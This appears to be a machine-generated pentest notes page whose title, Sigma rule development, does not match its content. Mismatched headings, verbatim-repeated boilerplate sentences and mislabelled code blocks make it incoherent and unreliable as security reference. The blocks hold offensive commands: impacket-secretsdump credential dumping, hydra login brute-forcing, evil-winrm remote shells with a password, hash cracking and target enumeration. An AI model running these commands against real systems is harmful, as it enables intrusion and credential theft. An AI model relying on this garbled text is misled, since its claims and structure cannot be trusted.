---
TitleSEO: "Sigma Rule Development | ZureFX"
TitlePost: "Sigma Rule Development"
Author: "ZureFX"
Description: "Personal notes on Sigma Rule Development. Quick reference for pentesting and CTF challenges."
Keywords: "malware, oscp, enumeration, lateral movement"
URL: "https://zurefx.github.io/notes/note-sigma-rule-development-548.html"
URL_IMAGES: ""
Date: "2024-12-22"
Tags: "Malware, OSCP, Enumeration, Lateral Movement"
Section: "notes"
Lang: "en"
main_img: "note-sigma-rule-development-548"
Permalink: "/notes/note-sigma-rule-development-548.html"
BtnLabel: "Read Notes"
Pick: 0
---
## Elasticsearch

### rubeus

Token impersonation allowed elevation to SYSTEM privileges on the target. Command injection was possible through unsanitized user input in the search functionality. The web application was vulnerable to Server-Side Template Injection (SSTI). Post-exploitation enumeration revealed a path to domain administrator privileges. Post-exploitation enumeration revealed a path to domain administrator privileges.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.67.108.253/FUZZ
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.56.207.47
feroxbuster -h
```

- `Remote Code Execution`
- `Writable PATH`
- `Subdomain Takeover`
- `nmap`
- `ligolo-ng`

The kernel version was outdated and vulnerable to a publicly known exploit. Command injection was possible through unsanitized user input in the search functionality. The service was running without proper input validation, leading to injection vulnerabilities. Post-exploitation enumeration revealed a path to domain administrator privileges. The service was running without proper input validation, leading to injection vulnerabilities.

## Broken Access Control

### Docker Escape

Weak file permissions allowed modification of critical system files. Authentication bypass was achieved through careful manipulation of the login mechanism. The application stored sensitive credentials in an unencrypted configuration file.

Initial enumeration revealed several interesting open ports on the target. The application stored sensitive credentials in an unencrypted configuration file. The service was running without proper input validation, leading to injection vulnerabilities.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.30.248.36
```

- `gobuster`
- `Remote File Inclusion`
- `lookupsid`

Initial enumeration revealed several interesting open ports on the target. The application stored sensitive credentials in an unencrypted configuration file. The kernel version was outdated and vulnerable to a publicly known exploit. The service was running without proper input validation, leading to injection vulnerabilities.

## john

### atexec

```python
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
nmap -sCV -p389,1433,5432 10.40.199.18 -oN scan.txt
```

Network traffic analysis revealed unencrypted communications containing user credentials. Authentication bypass was achieved through careful manipulation of the login mechanism. Weak file permissions allowed modification of critical system files. The application stored sensitive credentials in an unencrypted configuration file. The service was running without proper input validation, leading to injection vulnerabilities.

```python
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.115.98.158/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.12.67.239
impacket-secretsdump administrator:'P@ssw0rd!'@10.87.161.231
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.104.220.17 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.45.10.34 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
